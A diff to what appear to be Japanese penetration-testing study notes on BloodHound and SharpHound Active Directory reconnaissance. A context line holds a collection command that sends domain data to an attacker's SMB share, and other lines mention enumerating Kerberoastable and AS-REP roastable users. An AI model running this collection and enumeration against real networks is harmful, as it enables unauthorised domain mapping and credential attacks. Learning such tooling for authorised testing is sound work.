@@ -121,7 +121,8 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<attacker_IP>\share -
 > - WinRM接続など、インタラクティブなシェルが使えない場合は [[#SharpHoundの実行エラーとその対策]]を参照 
 > - Tunneling環境では手間だがSharpHoundを転送、結果ファイルを転送させる
 > 	- `net use`ではポート指定ができないため、Ligolo-ngのListenerで445以外を指定してもSMB接続ができないし、また、Agentが445を使っているとき、Listnerを445に立てて、ということができない
-
+- csvファイルは使えない（BCEのバージョンが1.xxなら使えるが、古い）
+- ローカルGPOは収集できない
 3. 攻撃者のマシンに戻り、BloodHoundのAdministration > File IngestでUpload Fileを実行し、SharpHoundの実行結果であるzipファイルをアップロードする
 ![[Pasted image 20251006074057.png]]
 $$File　IngestのStatusがCompleteになれば分析準備OK$$
@@ -200,6 +201,8 @@ $$groupラベルでadminとつくグループのみを検索している$$
 > - AS-REP Roastable users (DontReqPreAuth)
 > - All Kerberoastable users
 
+![[Pasted image 20251006124753.png]]
+$$定義済みクエリですべてのドメインadminを列挙しているイメージ$$
 
 ---
 
